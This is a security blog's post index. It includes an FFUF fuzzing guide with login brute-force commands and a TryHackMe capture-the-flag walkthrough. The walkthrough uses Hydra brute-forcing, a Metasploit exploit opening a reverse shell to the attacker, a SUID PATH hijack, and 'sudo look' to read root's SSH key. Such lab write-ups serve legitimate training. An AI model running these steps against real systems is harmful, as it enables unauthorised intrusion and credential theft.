[
  
  {
    "title": "Bug Bounty Tools Assistant",
    "url": "/posts/python-bug-bounty-tools-assistant",
    "categories": "Python, Bug Bounty Tools Assistant",
    "tags": "Python, Bug Bounty Tool",
    "date": "2025-03-01 00:00:00 +0000",
    





    
    "snippet": "A Python-based interactive CLI tool designed to assist bug bounty hunters and security testers by providing quick access to commands for Recon, Exploitation, and Miscellaneous tasks.Bug Bounty Tool...",
    "content": "A Python-based interactive CLI tool designed to assist bug bounty hunters and security testers by providing quick access to commands for Recon, Exploitation, and Miscellaneous tasks.Bug Bounty Tools Assistant Repository  Link: Bug Bounty Tools Assistant RepositoryFeatures  Interactive Menu: Navigate through categories like Recon, Exploitation, and Miscellaneous with ease.  Command Execution: Execute or simulate commands for tools like commix, nuclei, ffuf, and more.  Clipboard Support: Commands are copied to your clipboard for quick use.  Extensible: Easily add new tools or categories by modifying the code structure.  Rich Output: Clear and visually appealing output using the rich library.How It WorksThe Bug Bounty Tools Assistant is an interactive CLI tool that allows users to select from predefined categories (Recon, Exploitation, Miscellaneous) and tools within those categories. Once a tool is selected, the associated command is displayed, copied to the clipboard, and optionally executed. The tool supports both real execution and simulated execution for testing purposes.For example:  Run the program using python main.py.  Select a category (e.g., Recon).  Choose a tool (e.g., Subdomain Enumeration).  The tool’s command will be displayed, copied to your clipboard, and optionally executed.Code Structure  main.py: Entry point of the application. Displays the main menu and handles user interaction.  utils/menu.py: Contains functions for displaying the main menu and handling tool selection.  tools/: Directory containing modules for different categories (recon.py, exploitation.py, miscellaneous.py).  execute_command.py: Handles the execution or simulation of commands.  LICENSE: License file for the project.InterfaceFuture Enhancements  Add support for additional tools and categories.  Introduce a web-based GUI for easier accessibility.  Implement automated updates for tool commands and configurations.  Add integration with APIs for real-time vulnerability scanning.Ethical ConsiderationsThis tool is intended for educational and ethical purposes only. Users are responsible for ensuring they have proper authorization before using this tool on any system or network. Unauthorized use of this tool may violate laws and regulations. Always follow ethical guidelines and respect privacy when conducting security tests."
  },
  
  {
    "title": "Deep Dork",
    "url": "/posts/python-deep-dork",
    "categories": "Python, Deep Dork",
    "tags": "Python, Deep Dork",
    "date": "2025-02-27 00:00:00 +0000",
    





    
    "snippet": "Deep Dork is an advanced Google Dorking tool designed to automate and streamline the process of discovering sensitive information exposed on the web. It leverages Google’s search engine, proxies, C...",
    "content": "Deep Dork is an advanced Google Dorking tool designed to automate and streamline the process of discovering sensitive information exposed on the web. It leverages Google’s search engine, proxies, CAPTCHA bypass mechanisms, and result parsing to provide a powerful utility for ethical security research and reconnaissance.In addition to the Python CLI version, Deep Dork Web is now available as a browser-based tool, offering an intuitive interface for performing advanced Google Dork searches without requiring local setup or dependencies. The web version supports real-time search filtering, dynamic query generation, and seamless integration with search engines like Google, making it accessible to users of all skill levels.Deep Dork Repository  CLI Version: Deep Dork Repository  Web Version: Deep Dork WebFeatures  Advanced Search with Google Dorks: Use predefined or custom Google Dork queries to uncover specific types of data, such as exposed files, directories, or vulnerable endpoints.  Proxy Support: Configure and validate HTTP, SOCKS4, and SOCKS5 proxies to anonymize requests and avoid IP blocking.  CAPTCHA Handling: Built-in mechanisms to bypass CAPTCHAs using Selenium headless browsing or third-party CAPTCHA-solving services.  Multi-threaded Proxy Validation: Efficiently test and validate large proxy lists in parallel to ensure reliability.  Search History &amp; Export: Maintain a history of searches and export results in JSON or CSV format for further analysis.  Customizable Dork Templates: Load predefined Dork templates from a JSON file or create your own for tailored searches.  Interactive Menu System (CLI): A user-friendly command-line interface for seamless navigation and operation.  Real-Time Search Filtering (Web): Dynamically filter dorks based on search terms and categories in the browser-based version.  Dynamic Query Generation (Web): Replace placeholders in dork queries with user-provided input for personalized searches.  Search Engine Integration (Web): Generate direct links to Google search results for selected dorks.How It Works  Query Construction: The tool allows users to input a domain, name, or other target-specific keywords. These are combined with predefined or custom Google Dork templates to form search queries.  Search Execution: The tool sends requests to Google’s search engine using randomized User-Agent headers and optional proxies to avoid detection and blocking.  Result Parsing: The HTML response from Google is parsed using BeautifulSoup to extract relevant details like titles, URLs, and snippets.  CAPTCHA Bypass: If a CAPTCHA is encountered, the tool can either use Selenium to simulate browser behavior or delegate solving to a third-party service like 2Captcha.  Proxy Management: Proxies are tested for validity and performance before being used. The tool rotates through available proxies to distribute requests evenly.  Output &amp; Export: Results are displayed in the CLI or web interface and can be saved to a file in JSON or CSV format for offline analysis.For the web version, users simply visit the hosted URL, enter their search terms, and click on generated links to view results directly in their browser.Code StructureThe project is organized into two main classes:  GoogleDorkSearch:          Handles the core functionality of constructing queries, sending requests, parsing results, and managing proxies.      Includes methods for testing proxies, bypassing CAPTCHAs, and parsing search results.        DorkMenu:          Provides an interactive menu system for users to configure proxies, run searches, view history, and export results.      Manages search history persistence and integrates with GoogleDorkSearch for executing operations.      Key Modules:  requests and BeautifulSoup: For sending HTTP requests and parsing HTML responses.  selenium: For CAPTCHA bypass using headless Chrome.  fake_useragent: To generate random User-Agent strings for request headers.  threading: For concurrent proxy validation and testing.  json and csv: For saving and exporting search results and history.For the web version, the tool uses:  HTML/CSS/JavaScript: For the responsive and modern user interface.  fetch API: To load predefined dorks from a JSON file dynamically.  Dynamic Link Generation: To integrate seamlessly with search engines like Google.InterfaceCLI VersionThe tool provides an intuitive CLI-based interface with the following options:  Advanced Search: Run custom or predefined Google Dork queries.  Run All Dorks Automatically: Iterate through a list of predefined Dork templates and execute them sequentially.  Configure Proxies: Add proxies manually or load them from a file, with automatic validation.  View History: Display past searches and their results.  Export Results: Save search results to a file in JSON or CSV format.  Test Proxies: Validate the configured proxies to ensure they are functional.  Solve CAPTCHA: Use a third-party CAPTCHA-solving service to handle blocked requests.  Exit: Save the search history and exit the program.Web VersionThe web interface includes:  Search Bar: Enter keywords or phrases to filter dorks dynamically.  Category Filter: Narrow down results by selecting specific categories.  Real-Time Results: View matching dorks with their queries, categories, and descriptions.  Direct Links: Click on generated links to open search results in Google or other supported search engines.  Responsive Design: Accessible and functional on both desktop and mobile devices.Limitations  Rate Limiting: Google may impose rate limits or block IPs despite using proxies, requiring careful configuration.  CAPTCHA Dependency: CAPTCHA bypass mechanisms may fail if Google implements stricter anti-bot measures.  Ethical Constraints: The tool should only be used for authorized security assessments. Misuse can lead to legal consequences.  Proxy Reliability: The effectiveness of the tool depends on the quality and availability of proxies.Future Enhancements  Enhanced CAPTCHA Handling: Integrate additional CAPTCHA-solving services or machine learning models for improved accuracy.  GUI Implementation: Develop a graphical user interface (GUI) for broader accessibility.  API Integration: Provide an API endpoint for integrating the tool into larger security workflows.  Support for Other Search Engines: Extend functionality to include Bing, DuckDuckGo, and other search engines.  Automated Report Generation: Generate detailed reports with insights and recommendations based on search results.Ethical ConsiderationsThis tool is intended for ethical use only, such as penetration testing, vulnerability assessments, and security research. Unauthorized use of this tool to access or exploit sensitive information is strictly prohibited and may violate laws and regulations. Always ensure you have explicit permission before conducting any reconnaissance or scanning activities.By using this tool, you agree to abide by all applicable laws and ethical guidelines. The developers and contributors of this project are not responsible for any misuse or illegal activities carried out with this software."
  },
  
  {
    "title": "Github Scraper",
    "url": "/posts/python-github-scraper",
    "categories": "Python, Github Scraper",
    "tags": "Python, Github Scraper",
    "date": "2025-02-25 00:00:00 +0000",
    





    
    "snippet": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter re...",
    "content": "Tool designed to scrape and analyze repositories from GitHub based on customizable search criteria.Github Scraper Repository  Link: Github Scraper RepositoryFeatures  Customizable Search: Filter repositories by programming language, associated tools/technologies (e.g., Docker, React, TensorFlow), and star ratings.  Date Filtering: Retrieve repositories updated within a specific time range (e.g., last 6 months, 1 year).  Rate Limit Handling: Automatically handles GitHub API rate limits to ensure uninterrupted scraping.  CLI and GUI Interfaces: Offers both command-line and graphical user interfaces for flexibility.  Metadata Extraction: Fetches repository metadata, including the latest commit date, owner details, and more.  Retry Mechanism: Implements retry logic for failed API requests, ensuring robustness.How It WorksThe GitHub Scanner uses the GitHub REST API to query repositories based on user-defined parameters. Here’s a step-by-step breakdown of its operation:  Input Parameters: The user specifies search criteria such as programming language, tools, star range, and date range.  API Requests: The tool sends requests to the GitHub API to fetch matching repositories.  Data Processing: Extracts relevant metadata, such as repository name, owner, latest commit date, and star count.  Output: Displays the results in a structured format (e.g., CLI output or GUI table).The scraper also includes a retry mechanism to handle rate limits and transient errors gracefully.Code StructureThe codebase is organized into modular components for maintainability and scalability:  API Interaction:          make_api_request: Handles API calls with retry logic and rate limit management.      check_rate_limit: Fetches and displays the current rate limit status.        Search Functions:          search_repositories: Queries GitHub for repositories based on search criteria.      get_repository_metadata: Retrieves detailed metadata for a specific repository.        Utility Functions:          is_within_date_range: Filters repositories based on the latest commit date.      get_latest_commit_date: Fetches the most recent commit date for a repository.        User Interface:          CLI: Provides a text-based interface for input and output.      GUI: Offers a graphical interface for ease of use.      InterfaceCLI VersionThe CLI version provides a straightforward, text-based interface for users who prefer simplicity and speed. Below is an example of the CLI interface:GUI VersionThe GUI version offers a more interactive experience with dropdown menus, checkboxes, and visual feedback. Users can select programming languages, filter by tools/technologies, specify star ranges, and set date filters through intuitive controls. A progress bar provides real-time updates during the scraping process, while a log area displays clickable links to the discovered repositories.Here’s a preview of the GUI interface:Creating a GitHub TokenTo use the GitHub Scanner, you need to generate a personal access token:  Go to your GitHub Account Settings.  Navigate to Developer Settings → Personal Access Tokens → Tokens (classic).  Click Generate New Token and select Generate New Token (classic).  Select the necessary scopes (e.g., repo, read:org).  Copy the generated token and paste it into the script where indicated (YOUR_GITHUB_TOKEN_HERE).Limitations  Rate Limits: GitHub imposes strict rate limits on unauthenticated and authenticated API requests. While the scraper handles these limits, excessive queries may still lead to temporary blocks.  Search Complexity: Complex queries with multiple filters may take longer to process due to API constraints.  Data Completeness: The scraper relies on GitHub’s API, which may not expose all repository details.Future Enhancements  Advanced Filters: Add support for filtering by license type, repository size, or contributor count.  Export Options: Allow users to export results in various formats (e.g., CSV, JSON, Excel).  Parallel Processing: Implement multi-threading to speed up large-scale queries.  Web Interface: Develop a web-based dashboard for remote access and collaboration.  Machine Learning Integration: Use ML models to recommend repositories based on user preferences.Ethical Considerations  Respect Rate Limits: Always adhere to GitHub’s API usage policies to avoid overloading their servers.  Data Privacy: Ensure that scraped data is used responsibly and does not violate any privacy agreements.  Attribution: Properly credit repository owners when using their data for research or analysis.Tips and Tricks  Optimize Queries: Use specific keywords and filters to narrow down results and reduce API calls.  Monitor Rate Limits: Regularly check your rate limit status to avoid unexpected interruptions.  Use Tokens Wisely: Authenticate with a personal access token to increase your rate limit allowance.  Batch Processing: For large datasets, consider breaking queries into smaller batches to stay within rate limits.Extra Insights  The scraper supports multiple programming languages and tools, making it versatile for various use cases.  By analyzing the latest commit dates, users can identify actively maintained repositories.  Combining star ratings with other filters helps prioritize high-quality projects."
  },
  
  {
    "title": "Cross Site Scripting (XSS)",
    "url": "/posts/bug-bounty/xss",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, XSS, Vulnerabilities",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "SQL Injection",
    "url": "/posts/bug-bounty/sql-injection",
    "categories": "Bug Bounty, Vulnerabilities",
    "tags": "Bug Bounty, SQL, Vulnerabilities",
    "date": "2025-02-23 00:00:00 +0000",
    





    
    "snippet": "Coming-Soon",
    "content": "Coming-Soon"
  },
  
  {
    "title": "FFUF: Fuzzing Guide to Web Applications",
    "url": "/posts/ffuf-Fuzzing-Guide",
    "categories": "Tools, FFUF Fuzzing Guide",
    "tags": "Tools, FFUF",
    "date": "2025-02-15 00:00:00 +0000",
    





    
    "snippet": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuz...",
    "content": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuzzing. This guide will provide an in-depth explanation of FFUF commands, their use cases, and advanced techniques to help you leverage its full potential.Table of Contents  Installation  Basic Commands  Advanced Features  Output Options  Custom WordlistsInstallationTo install FFUF on your system, follow the instructions below:Debian/Ubuntu Based Systemssudo apt update &amp;&amp; sudo apt install ffufmacOS (Using Homebrew)brew install ffufOther Operating SystemsFor other operating systems, download the binary from the official GitHub repository:GitHub - ffuf: Fast web fuzzer written in GoOnce downloaded, extract the binary and add it to your system’s PATH.Basic CommandsDirectory and File Brute ForceOne of the most common uses of FFUF is finding hidden directories and files on a web server. Use the -u flag to specify the target URL and the -w flag to provide a wordlist.ffuf -u https://example.com/FUZZ -w wordlist.txtExplanation:  FUZZ: A placeholder that FFUF replaces with words from the wordlist.  wordlist.txt: A text file containing potential directory or file names.POST Request with WordlistTo fuzz POST requests, use the -X POST flag.ffuf -w wordlist.txt -u https://website.com/FUZZ -X POSTThis command sends POST requests while fuzzing the URL path.Case Insensitive MatchingUse the -ic flag for case-insensitive matching, which is useful when unsure about server case sensitivity.ffuf -u https://example.com/FUZZ -w wordlist.txt -ic -cThe -c flag adds color-coded output for better readability.File Extension FuzzingTo search for files with specific extensions, use the -e flag.ffuf -u https://example.com/indexFUZZ -w wordlist.txt -e .php,.asp,.bak,.dbThis command appends extensions like .php, .asp, .bak, and .db to each word in the wordlist.Recursive FuzzingFor multi-level directory fuzzing, use the -recursion flag.ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3This scans up to three levels deep, helping uncover deeply nested directories.Advanced FeaturesFiltering ResponsesFilter responses based on HTTP status codes or response sizes.ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404,500This excludes responses with status codes 404 or 500.Multi Wordlist FuzzingFuzz multiple parameters using separate wordlists.ffuf -u https://example.com/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2Here, W1 and W2 are placeholders replaced by words from dict.txt and dns_dict.txt, respectively.Subdomain and Virtual Host FuzzingSubdomain FuzzingDiscover hidden subdomains by replacing the FUZZ keyword in the target URL.ffuf -w subdomains.txt -u https://FUZZ.example.com/Virtual Host (VHost) FuzzingFuzz the Host header to detect virtual hosts.ffuf -w vhosts.txt -u https://example.com/ -H \"Host: FUZZ.example.com\"Fuzzing HTTP ParametersGET Parameter FuzzingFind potential GET parameters by fuzzing the query string.ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=valuePOST Parameter FuzzingTest APIs or login forms by fuzzing POST data.ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'Login Bypass TestingBrute force login systems by fuzzing the password parameter.ffuf -w passwordlist.txt -X POST -d \"username=admin&amp;password=FUZZ\" -u https://www.example.com/loginPUT Request FuzzingTest unauthorized file uploads or modifications.ffuf -w /path/to/wordlist.txt -X PUT -u https://target.com/FUZZ -b 'session=abcdef'Advanced FFUF TechniquesClusterbomb ModeCombine multiple wordlists for comprehensive testing.ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZThis tests every combination of usernames and passwords.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode clusterbombPitchfork ModePair corresponding entries from two wordlists for controlled brute force testing.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode pitchforkSetting CookiesInclude cookies in your requests for authenticated fuzzing.ffuf -b \"SESSIONID=abcd1234; USER=admin\" -w wordlist.txt -u https://example.com/FUZZUsing ProxiesRoute FFUF requests through a proxy like Burp Suite for deeper analysis.ffuf -x http://127.0.0.1:8080 -w wordlist.txt -u https://example.com/FUZZCustom Header FuzzingFuzz custom headers to identify vulnerabilities.ffuf -w headers.txt -u https://example.com/ -H \"X-Custom-Header: FUZZ\"Fuzzing with Custom User-AgentModify the User-Agent header to mimic specific browsers.ffuf -u \"https://example.com/FUZZ\" -w wordlist.txt -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"Rate Limiting BypassControl the request rate to avoid triggering rate limiting defenses.ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 50 -t 50Output OptionsSave results in various formats for further analysis.HTML Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.html -of htmlJSON Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of jsonCSV Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.csv -of csvSave all output formats at once:ffuf -w wordlist.txt -u https://example.com/FUZZ -o results -of allCustom Wordlists with PayloadsAccess the wordlists with payloads here:  SecLists  PayloadsAllTheThings and PayloadsAllTheThings Website  PayloadBox"
  },
  
  {
    "title": "Browser Extensions for Cybersecurity",
    "url": "/posts/browser-extensions-cybersecurity",
    "categories": "Tools, Browser Extensions",
    "tags": "Tools, Browser Extensions",
    "date": "2025-02-13 00:00:00 +0000",
    





    
    "snippet": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gath...",
    "content": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gathering intelligence, and improving your workflow. From detecting exposed credentials to managing proxies and analyzing metadata.Reconnaissance &amp; Information Gathering1. Wappalyzer — Technology DetectorWhy It’s Useful: Identifies the technology stack of websites, including frameworks, CMS, and server details.Link: Wappalyzer - Chrome Web Store2. Shodan — Website Intelligence ToolWhy It’s Useful: Provides information on website hosting, server locations, and open ports.Link: Shodan - Chrome Web Store3. Mitaka — OSINT Search ToolWhy It’s Useful: Searches IPs, domains, URLs, and hashes across multiple threat intelligence platforms.Link: Mitaka - Chrome Web Store4. Vortimo OSINT ToolWhy It’s Useful: A versatile tool for bookmarking, scraping, and analyzing web pages during OSINT investigations.Link: Vortimo OSINT Tool - Chrome Web Store5. Hunter.io — Finding Emails on WebsitesWhy It’s Useful: Extracts publicly available emails from websites for security reporting and OSINT investigations.Link: Hunter - Chrome Web Store6. WaybackURL — Fetch Archived URLsWhy It’s Useful: Retrieves all URLs from the Wayback Machine to identify past versions of web pages.Link: Wayback Machine - Chrome Web Store7. Traduzir Paginas Web — Webpage TranslatorWhy It’s Useful: Translates entire web pages into different languages for analyzing foreign websites.Link: Google Translate - Chrome Web Store8. EXIF Viewer Pro — Extract Image MetadataWhy It’s Useful: Retrieves metadata from images directly on a webpage for forensic analysis and OSINT investigations.Link: EXIF Viewer Pro - Chrome Web StoreTesting &amp; Exploitation9. HackTools — Payload GeneratorWhy It’s Useful: Provides pre-built payloads for SQLi, XSS, and other attacks to save time during manual testing.Link: Hack-Tools - Chrome Web Store10. EditThisCookie — Advanced Cookie EditorWhy It’s Useful: Allows modification, deletion, and analysis of cookies, including checking HTTPOnly and Secure flags.Link: EditThisCookie - Chrome Web Store11. D3coder — Encode/Decode ToolWhy It’s Useful: Encodes and decodes various text formats like Base64, URL encoding, and Unix timestamps.Link: D3coder - Chrome Web Store12. EndPointer — Find Sensitive URLsWhy It’s Useful: Extracts and analyzes URLs for potential security endpoints during penetration testing.Link: EndPointer - Chrome Web Store13. Link Gopher — Extract All LinksWhy It’s Useful: Fetches all links from a webpage for reconnaissance purposes.Link: Link Gopher - Chrome Web Store14. FindSomething — Hidden Parameter FinderWhy It’s Useful: Scans source code and JavaScript files for interesting patterns and hidden data, such as API keys.Link: FindSomething - Chrome Web Store15. .git Finder — Information DisclosureWhy It’s Useful: Detects exposed .git directories that may lead to source code leaks.Link: .git Finder - Chrome Web Store16. S3BucketList — AWS Bucket FinderWhy It’s Useful: Searches for publicly accessible AWS S3 buckets to detect misconfigured cloud storage.Link: S3BucketList - Chrome Web StoreAutomation &amp; Efficiency17. FoxyProxy — Proxy Management for Burp SuiteWhy It’s Useful: Simplifies proxy management for intercepting web traffic with tools like Burp Suite or OWASP ZAP.Link: FoxyProxy - Chrome Web Store18. Open Multiple URLs — Bulk URL OpenerWhy It’s Useful: Opens multiple links simultaneously, saving time during bug hunting.Link: Open Multiple URLs - Chrome Web Store19. YesWeHack VDP FinderWhy It’s Useful: Detects vulnerability disclosure programs (VDP) of visited websites for responsible reporting.Link: YesWeHack VDP Finder - Chrome Web Store20. SponsorBlock — Skip YouTube SponsorsWhy It’s Useful: Skips sponsored segments, intros, and outros on YouTube videos to save time.Link: SponsorBlock - Chrome Web StorePrivacy &amp; Security21. uBlock Origin — Ad and Tracker BlockerWhy It’s Useful: Blocks ads, trackers, and malicious scripts to improve privacy and security.Link: uBlock Origin - Chrome Web Store22. WebRTC Protect — Protect IP LeakWhy It’s Useful: Disables WebRTC to prevent IP address leakage, ensuring anonymity while browsing.Link: WebRTC Protect - Chrome Web Store23. Temp-Mail — Disposable Email ServiceWhy It’s Useful: Provides temporary email addresses to avoid spam and protect your personal information.Link: Temp Mail - Chrome Web Store24. Dark Reader — Eye ProtectionWhy It’s Useful: Provides a dark mode for all websites to reduce eye strain during late-night sessions.Link: Dark Reader - Chrome Web Store"
  },
  
  {
    "title": "THM: Lookup",
    "url": "/posts/ctf-redteam-lookup",
    "categories": "CTF, Red Team",
    "tags": "CTF, Red Team",
    "date": "2025-02-12 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover hidden resources.  Hydra: For brute-forcing login credentials.  Metasploit: For exploiting the elFinder command injection vulnerability.  Python: For spawning an interactive shell.  Linpeas: For automating enumeration and identifying privilege escalation vectors.Resources Used:  GTFOBins: A repository of Unix binaries that can be exploited for privilege escalation.  SecLists: A collection of wordlists used for brute-forcing credentials with Hydra.  Exploit DB: An alternative resource for finding exploits, such as the one used for elFinder.Step 1: Scanning the Target NetworkWe begin by scanning the target machine 10.10.41.18 using Nmap to identify open ports and services.Command:nmap 10.10.41.18 -sV -sCOutput:Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 ISTNmap scan report for lookup.thm (10.10.41.18)Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Observations:  Port 22 (SSH): Running OpenSSH 8.2p1.  Port 80 (HTTP): Running Apache HTTP Server 2.4.41.Step 2: Discovering Subdomains with GobusterTo find any hidden subdomains or directories, we use Gobuster:Command:gobuster dns -d lookup.thm -w /usr/share/wordlists/dirb/common.txtOutput:===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     lookup.thm[+] Method:                  DNS[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Timeout:                 10s===============================================================2025/01/05 18:00:00 Starting gobuster in DNS subdomain enumeration mode===============================================================files.lookup.thm (Status: FOUND)...Key Concept:  Gobuster: A tool for discovering subdomains, directories, and files on a web server. In this case, we used it to uncover the files.lookup.thm subdomain.Step 3: Adding Target to Hosts FileFor easier navigation, we add the target’s IP to the /etc/hosts file.Commands:echo \"10.10.41.18 lookup.thm\" | sudo tee -a /etc/hostsecho \"10.10.41.18 files.lookup.thm\" | sudo tee -a /etc/hostsStep 4: Navigating to the Web ApplicationAfter updating the hosts file, we open the web application in a browser. The login page appears.Attempting Default Credentials:We attempt to log in with common default credentials but are met with a “wrong password” message and a 3-second delay before redirection.Key Concept:  Brute Force Protection: The delay is likely implemented to prevent brute-force attacks.Step 5: Brute Forcing Login Using HydraSince default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.Command:hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=try again\"Output:[80][http-post-form] host: lookup.thm   login: jose   password: password123Key Concept:  Hydra: A powerful tool for brute-forcing login forms. It automates the process of trying multiple username-password combinations.Step 6: Logging InUsing the discovered credentials (jose:password123), we log into the system. After logging in, we are redirected to the files.lookup.thm domain.Step 7: Exploring the credential.txt FileUpon opening the credential.txt file, we find some credentials that might be for SSH. However, attempting to use these credentials fails:Command:ssh think@10.10.41.18Output:think@10.10.41.18's password:Permission denied, please try again.Step 8: Identifying VulnerabilitiesWhile interacting with the system, we discover a vulnerable web application called elFinder running on the target machine.Version Discovery:By inspecting the web interface, we determine the version of elFinder (2.1.47).Searching for Exploits:We search for exploits related to this version in Metasploit and Exploit DB:Commands:msfconsole -qsearch elfinder 2.1.47Output:Matching Modules================    #  Name                                                               Disclosure Date  Rank       Check  Description   -  ----                                                                ---------------  ----       -----  -----------   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command InjectionKey Concept:  Metasploit: A framework for developing and executing exploit code against remote targets.  Exploit DB: A database of public exploits and shellcode. You could have searched for the vulnerability here as well.Step 9: Exploiting the elFinder VulnerabilityWe select and configure the exploit module for elFinder:Commands:use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injectionset LHOST tun0set RHOST files.lookup.thmrunOutput:[*] Started reverse TCP handler on 10.17.14.127:4444 [*] Uploading payload 'TRNyzgLuCE.jpg;echo ...' (1975 bytes)[*] Triggering vulnerability via image rotation ...[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...[*] Sending stage (40004 bytes) to 10.10.41.18[+] Deleted .7mrFCOx.php[*] Meterpreter session 1 opened (10.17.14.127:4444 -&gt; 10.10.41.18:35566)Key Concept:  Command Injection: The vulnerability allows us to inject commands into the application, which are then executed by the server.Step 10: Spawning a ShellOnce inside the system, we have a limited shell as the www-data user. To make it more interactive, we spawn a proper shell using Python:Command:python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Key Concept:  PTY Shell: A pseudo-terminal provides a fully interactive shell, allowing us to execute complex commands and navigate the system effectively.At this point, we could have used linpeas to automate the enumeration process and check for every privilege escalation possibility:Steps:  Upload linpeas.sh to the target machine.  Execute it with the following command:    ./linpeas.sh        Linpeas would have highlighted potential privilege escalation vectors, such as misconfigured SUID binaries or weak file permissions.Step 11: Privilege EscalationAs the www-data user, we check for potential privilege escalation opportunities.Checking SUID Binaries:We search for binaries with the SUID bit set:Command:find / -perm /4000 2&gt;/dev/nullOutput:/usr/sbin/pwmKey Concept:  SUID Bit: Files with the SUID bit set allow users to execute them with the file owner’s privileges.Exploiting the pwm Binary:We manipulate the PATH variable to exploit the pwm binary:Commands:export PATH=/tmp:$PATHecho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' &gt; /tmp/idchmod +x /tmp/id/usr/sbin/pwmThis changes the user to think.Step 12: SSH Brute-ForcingWe perform an SSH brute-force attack using Hydra to gain access as the think user:Command:hydra -l think -P wordlist.txt ssh://lookup.thmOutput:think:josemario.AKA(think)Logging In:ssh think@lookup.thmRetrieving User Flag:cat /home/think/user.txt{REDACTED}Step 13: Privilege Escalation to RootAs the think user, we check for sudo privileges:Command:sudo -lOutput:User think may run the following commands on lookup:(ALL) /usr/bin/lookExploiting the look Command:Using GTFOBins, we find a method to read sensitive files with the look command:Command:LFILE=/root/.ssh/id_rsasudo look '' \"$LFILE\"This grants us the root user’s private SSH key.Logging In as Root:ssh -i /tmp/id_rsa root@lookup.thmRetrieving Root Flag:cat /root/root.txt{REDACTED}"
  },
  
  {
    "title": "Honeypot Suite",
    "url": "/posts/python-honeypot-suite",
    "categories": "Python, Honeypot Suite",
    "tags": "Python, Honeypot Suite",
    "date": "2025-02-09 00:00:00 +0000",
    





    
    "snippet": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup,...",
    "content": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup, maintenance, and contribution.Honeypot Suite Repository  Link: Honeypot Suite RepositoryDirectory StructureThe repository follows a modular structure for clarity and extensibility:honeypot-suite/├── https_honeypot.py       # HTTPS honeypot implementation├── dns_honeypot.py         # DNS honeypot implementation├── ssh_honeypot.py         # SSH honeypot implementation├── ftp_honeypot.py         # FTP honeypot implementation├── postgresql_honeypot.py  # PostgreSQL honeypot implementation├── menu.py                 # Centralized GUI for managing honeypots└──  README.md               # Project documentationFeaturesThe honeypot suite is designed to simulate various network services, allowing you to monitor and analyze malicious activities. Key features include:  Multi-Protocol Support: Supports HTTPS, DNS, SSH, FTP, and PostgreSQL protocols.  Dynamic Configuration: Allows users to configure host, port, and protocol-specific settings via a GUI or command-line interface.  Real-Time Logging: Logs all interactions with the honeypot in real-time, providing detailed insights into attacker behavior.  Customizable Responses: Each honeypot can be configured to respond with custom data (e.g., fake IP addresses for DNS, dummy responses for SSH).  Self-Signed Certificates: Automatically generates SSL/TLS certificates for HTTPS and SSH honeypots.  Cross-Platform Compatibility: Works on Windows, macOS, and Linux.How It WorksThe honeypot suite operates by mimicking vulnerable network services to attract attackers and log their interactions. Here’s an overview of how it works:  Service Simulation:          Each honeypot module simulates a specific protocol (e.g., DNS, SSH) and listens for incoming connections.      The honeypot responds to queries or login attempts with predefined or dynamically generated data.        Logging:          All interactions are logged to files (e.g., dns_honeypot.log, ssh_honeypot.log) for later analysis.      Logs include details such as source IP, port, query type, username/password attempts, and more.        GUI Management:          A professional GUI (menu.py) allows users to select, configure, and manage honeypots easily.      Start/stop buttons ensure seamless control over each service.        Termination:          